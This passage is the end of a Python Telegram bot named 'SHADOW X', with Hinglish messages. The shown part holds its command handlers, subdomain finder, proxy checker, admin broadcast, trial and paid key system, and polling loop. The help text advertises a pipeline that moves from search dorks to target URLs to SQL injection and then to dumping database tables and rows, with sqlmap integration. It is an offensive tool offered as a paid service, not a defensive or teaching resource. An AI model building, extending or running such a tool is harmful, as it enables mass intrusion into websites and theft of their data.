            if not names:
                send(chat, "😕 Kuch nahi mila.", back_kb())
                return
            path = write_file(names, "subs", f"SHADOW X — {dom}")
            send_file(chat, path, f"🕸 {len(names)} subdomains")
            send(chat, H("SUBFINDER — DONE") + f"\n\n🕸 <code>{len(names)}</code>", back_kb())
        threading.Thread(target=work, daemon=True).start()
        return

    if key == "proxy_check":
        proxies = [x for x in (norm_proxy(l) for l in lines) if x]
        if not proxies:
            send(chat, "❌ Valid proxy nahi mila.")
            return

        def work():
            live = asyncio.run(proxy_check(proxies))
            d = jload("proxies", {})
            d[str(uid)] = uniq(live + (d.get(str(uid)) or []))[:5000]
            jsave("proxies", d)
            send(chat, H("PROXIES — CHECK") + f"\n\n📥 {len(proxies)} | 🟢 {len(live)}", back_kb())
        threading.Thread(target=work, daemon=True).start()
        return

    if key == "cfg_threads":
        try:
            sset("threads", max(2, min(100, int(text))))
            send(chat, f"✅ Threads: {sget('threads')}", back_kb("cfg"))
        except Exception:
            send(chat, "❌ Number likho.")
        return

    if key == "cfg_pages":
        try:
            sset("pages", max(1, min(5, int(text))))
            send(chat, f"✅ Pages: {sget('pages')}", back_kb("cfg"))
        except Exception:
            send(chat, "❌ Number likho.")
        return

    if key == "support_msg":
        for a in ADMINS:
            send(a, f"📩 SUPPORT\n👤 {uid} @{esc(msg.from_user.username or '-')}\n\n{esc(text)}")
        send(chat, "✅ Owner ko bhej diya.", back_kb())
        return

    if key == "adm_bcast" and is_admin(uid):
        users = list((jload("users", {}) or {}).keys())
        ok = 0
        for u in users:
            try:
                bot.send_message(int(u), "📢 " + text, parse_mode="HTML")
                ok += 1
            except Exception:
                pass
        send(chat, f"✅ Sent {ok}/{len(users)}", back_kb("admin"))
        return

    send(chat, "⚠️ Samajh nahi aaya — /start", back_kb())


# ══════════════════════════════════════════════════════════════════════════════
#  COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.message_handler(commands=["start", "menu"])
@safe
def cmd_start(msg):
    uid = msg.from_user.id
    users = jload("users", {})
    u = users.setdefault(str(uid), {})
    if not u.get("first_seen"):
        u["first_seen"] = int(time.time())
        u["expires"] = int(time.time()) + int(sget("trial_hours", 24)) * 3600
    u["username"] = msg.from_user.username or ""
    jsave("users", users)
    open_main(msg.chat.id)


@bot.message_handler(commands=["ping"])
@safe
def cmd_ping(msg):
    send(msg.chat.id, H("PONG") + f"\n\n📦 <b>{VERSION}</b> · build <code>{BUILD}</code>\n"
         f"⏱ Uptime: <code>{int(time.time() - START_TS)}s</code>\n"
         f"🧵 Tasks: <code>{sum(1 for t in TASKS.values() if t.get('status') == 'running')}</code>")


@bot.message_handler(commands=["help"])
@safe
def cmd_help(msg):
    send(msg.chat.id, H("HELP") + "\n\n"
         "🚀 <b>Pipeline</b> — dorks → URLs → vulns\n"
         "🧠 <b>HQ KEYWORDS</b> — seed se UHQ keywords\n"
         "🧬 <b>DORKER</b> — param dorks\n"
         "🌐 <b>PARSER</b> — 10 engines se URLs\n"
         "💉 <b>INJECTOR</b> — error/boolean/time SQLi\n"
         "📥 <b>DUMPER</b> — DB tables + rows\n"
         "🎯 <b>QC</b> · 🛡 <b>WAF LAB</b> · 🕸 <b>SUBFINDER</b>\n\n"
         "/ping · /admin · /stop · /id", back_kb())


@bot.message_handler(commands=["id"])
@safe
def cmd_id(msg):
    send(msg.chat.id, f"🆔 <code>{msg.from_user.id}</code>")


@bot.message_handler(commands=["admin"])
@safe
def cmd_admin(msg):
    if not is_admin(msg.from_user.id):
        send(msg.chat.id, "⛔ Admin only.")
        return
    admin_screen(msg.chat.id)


@bot.message_handler(commands=["sqlmap"])
@safe
def cmd_sqlmap(msg):
    base = sqlmap_cmd_base()
    send(msg.chat.id, H("SQLMAP", "status") + "\n\n"
         + KV("Installed", ("✅ <code>" + esc(" ".join(base)) + "</code>") if base else "❌ nahi",
              "🐍") + "\n"
         + KV("Termux", "<code>pip install sqlmap</code>", "📦") + "\n\n"
         + P("Dumper screen → 🐍 SQLMAP button, ya native 📥 DUMPER."),
         back_kb("dump"))


@bot.message_handler(commands=["stop"])
@safe
def cmd_stop(msg):
    uid = msg.from_user.id
    n = 0
    for t, v in TASKS.items():
        if v.get("uid") == uid and v.get("status") == "running":
            task_stop(t)
            n += 1
    send(msg.chat.id, f"⛔ {n} task stopped.")


@bot.message_handler(commands=["redeem"])
@safe
def cmd_redeem(msg):
    parts = (msg.text or "").split()
    if len(parts) < 2:
        send(msg.chat.id, "Usage: <code>/redeem SHX-XXXX-XXXX</code>")
        return
    key = parts[1].strip().upper()
    keys = jload("keys", {}) or {}
    rec = keys.get(key)
    if not rec or rec.get("used_by"):
        send(msg.chat.id, "❌ Invalid ya used key.")
        return
    rec["used_by"] = msg.from_user.id
    rec["used_at"] = int(time.time())
    keys[key] = rec
    jsave("keys", keys)
    users = jload("users", {})
    u = users.setdefault(str(msg.from_user.id), {})
    u["expires"] = max(int(u.get("expires") or 0), int(time.time())) + int(rec.get("days", 7)) * 86400
    jsave("users", users)
    send(msg.chat.id, f"✅ KEY ACTIVATED\n⏳ {rec.get('days', 7)} din")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
START_TS = time.time()


def main():
    print(f"🐍 SHADOW X {VERSION} ({BUILD}) starting…")
    try:
        me = bot.get_me()
        print(f"✅ @{me.username} online")
    except Exception as e:
        print(f"⚠️ get_me fail: {e}")
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=25)
        except KeyboardInterrupt:
            print("⛔ stopped")
            break
        except Exception as e:
            print("⚠️ restart:", e)
            time.sleep(5)


if __name__ == "__main__":
    main()
